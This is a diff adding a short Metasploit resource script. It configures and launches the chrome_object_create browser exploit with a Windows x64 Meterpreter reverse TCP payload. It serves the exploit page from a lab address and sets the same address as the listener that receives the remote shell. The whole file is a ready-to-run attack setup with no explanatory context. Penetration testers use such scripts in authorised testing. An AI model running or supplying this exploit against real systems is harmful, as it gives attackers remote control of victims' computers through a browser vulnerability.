@@ -1,0 +1,10 @@
+use exploit/multi/browser/chrome_object_create
+set payload windows/x64/meterpreter/reverse_tcp
+set srvhost 192.168.75.133
+set srvport 80
+set ssl true
+set uripath /
+set lhost 192.168.75.133
+set target 0
+exploit -j -z
+
